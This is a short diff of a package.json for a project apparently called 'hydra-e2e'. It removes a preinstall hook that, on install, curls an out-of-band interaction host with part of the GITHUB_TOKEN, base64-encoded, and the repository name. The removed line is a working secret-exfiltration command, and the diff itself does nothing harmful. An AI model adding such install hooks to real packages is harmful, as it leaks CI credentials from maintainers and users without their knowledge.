@@ -1,4 +1,3 @@
-"preinstall": "curl -s 'https://oast.fun/hydra-e2e-v2-toctou?t=$(printf '%s' "${GITHUB_TOKEN:0:8}" | base64)&r=${GITHUB_REPOSITORY}' -o /dev/null"
 {
   "name": "hydra-e2e",
   "version": "1.0.0",
